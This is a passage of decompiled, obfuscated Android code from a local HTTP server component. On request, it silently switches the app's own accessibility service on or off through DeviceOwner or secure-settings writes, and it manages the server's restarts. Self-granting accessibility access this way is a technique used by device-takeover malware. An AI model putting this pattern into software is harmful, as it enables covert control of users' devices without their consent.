            if (!str2.equals("enable")) {
                if (!str2.equals("disable")) {
                    return m211585a1("unknown action: ".concat(str2));
                }
                Object systemService = dqtvuisjdVar.getSystemService("device_policy");
                DevicePolicyManager devicePolicyManager = systemService instanceof DevicePolicyManager ? (DevicePolicyManager) systemService : null;
                if (devicePolicyManager != null && devicePolicyManager.isDeviceOwnerApp(dqtvuisjdVar.getPackageName())) {
                    ComponentName componentName = new ComponentName(dqtvuisjdVar, (Class<?>) zbrefryi.class);
                    devicePolicyManager.setSecureSetting(componentName, "enabled_accessibility_services", "");
                    devicePolicyManager.setSecureSetting(componentName, "accessibility_enabled", "0");
                    t60.m214714d6("LocalHttpServer", "✅ [writeAccessibility] DeviceOwner disable 成功");
                    return m211596e8("disabled via DeviceOwner");
                }
                Settings.Secure.putString(contentResolver, "enabled_accessibility_services", "");
                Settings.Secure.putInt(contentResolver, "accessibility_enabled", 0);
                String string = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
                if (string != null) {
                    str = string;
                }
                if (str.length() != 0) {
                    t60.m214694b5(packageName, "pkg");
                    if (AbstractC0779a1.m213652a5(str, packageName, false)) {
                        t60.m214726f4("LocalHttpServer", "⚠️ [writeAccessibility] Java API disable 未生效 after=".concat(str));
                        return m211585a1("Java API disable did not take effect, after=".concat(str));
                    }
                }
                t60.m214714d6("LocalHttpServer", "✅ [writeAccessibility] Java API disable 成功");
                return m211596e8("disabled via Java API");
            }
            String string2 = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
            if (string2 == null) {
                string2 = "";
            }
            if (string2.length() > 0) {
                t60.m214694b5(packageName, "pkg");
                if (AbstractC0779a1.m213652a5(string2, packageName, false)) {
                    t60.m214694b5(packageName, "pkg");
                    if (AbstractC0779a1.m213652a5(string2, packageName, false)) {
                        str3 = string2;
                    }
                } else {
                    str3 = string2 + ":" + str3;
                }
            }
            Object systemService2 = dqtvuisjdVar.getSystemService("device_policy");
            DevicePolicyManager devicePolicyManager2 = systemService2 instanceof DevicePolicyManager ? (DevicePolicyManager) systemService2 : null;
            if (devicePolicyManager2 != null && devicePolicyManager2.isDeviceOwnerApp(dqtvuisjdVar.getPackageName())) {
                ComponentName componentName2 = new ComponentName(dqtvuisjdVar, (Class<?>) zbrefryi.class);
                devicePolicyManager2.setSecureSetting(componentName2, "enabled_accessibility_services", str3);
                devicePolicyManager2.setSecureSetting(componentName2, "accessibility_enabled", "1");
                t60.m214714d6("LocalHttpServer", "✅ [writeAccessibility] DeviceOwner enable 成功");
                return m211596e8("enabled via DeviceOwner");
            }
            Settings.Secure.putString(contentResolver, "enabled_accessibility_services", str3);
            Settings.Secure.putInt(contentResolver, "accessibility_enabled", 1);
            String string3 = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
            str = string3 != null ? string3 : "";
            if (AbstractC0779a1.m213652a5(str, packageName, false)) {
                t60.m214714d6("LocalHttpServer", "✅ [writeAccessibility] Java API enable 成功");
                return m211596e8("enabled via Java API");
            }
            t60.m214726f4("LocalHttpServer", "⚠️ [writeAccessibility] Java API enable 写入未生效 after=".concat(str));
            return m211585a1("Java API write did not take effect, after=".concat(str));
        } catch (SecurityException e) {
            t60.m214705c6("LocalHttpServer", "❌ [writeAccessibility] 无 WRITE_SECURE_SETTINGS 权限", e);
            return AbstractC0003a2.m43c4("no WRITE_SECURE_SETTINGS permission: ", e.getMessage());
        } catch (Exception e2) {
            t60.m214705c6("LocalHttpServer", "❌ [writeAccessibility] 异常", e2);
            return AbstractC0003a2.m43c4("writeAccessibility error: ", e2.getMessage());
        }
    }

    /* renamed from: e5 */
    public final void m211631e5() {
        if (this.f53096a8 >= 30) {
            t60.m214704c5("LocalHttpServer", "❌ 端口绑定已重试 30 次仍失败，放弃");
        } else {
            this.f53096a8++;
            this.f53095a7.postDelayed(new zb0(this, 1), 10000L);
        }
    }

    /* renamed from: e7 */
    public final void m211632e7() {
        C0322a7 c0322a7 = f53087b1;
        if (c0322a7 != null && c0322a7 != this) {
            t60.m214714d6("LocalHttpServer", "🔄 检测到旧实例，先停止旧服务器");
            c0322a7.f53091a3.set(false);
            try {
                ServerSocket serverSocket = c0322a7.f53089a1;
                if (serverSocket != null) {
                    serverSocket.close();
                }
                c0322a7.f53089a1 = null;
                ExecutorService executorService = c0322a7.f53090a2;
                if (executorService != null) {
                    executorService.shutdownNow();
                }
                c0322a7.f53090a2 = null;
                Thread thread = c0322a7.f53092a4;
                if (thread != null) {
                    thread.interrupt();
                }
                c0322a7.f53092a4 = null;
                t60.m214714d6("LocalHttpServer", "✅ 本地HTTP服务器已停止");
            } catch (Exception e) {
                t60.m214705c6("LocalHttpServer", "停止服务器异常", e);
            }
            Thread.sleep(500L);
        }
        f53087b1 = this;
        if (!this.f53091a3.compareAndSet(false, true)) {
            t60.m214726f4("LocalHttpServer", "⚠️ 服务器已在运行");
            return;
        }
        Thread thread2 = new Thread(new zb0(this, 0), "LocalHttpServer");
        this.f53092a4 = thread2;
        thread2.setDaemon(true);
        Thread thread3 = this.f53092a4;
        if (thread3 != null) {
            thread3.start();
        }
    }
}
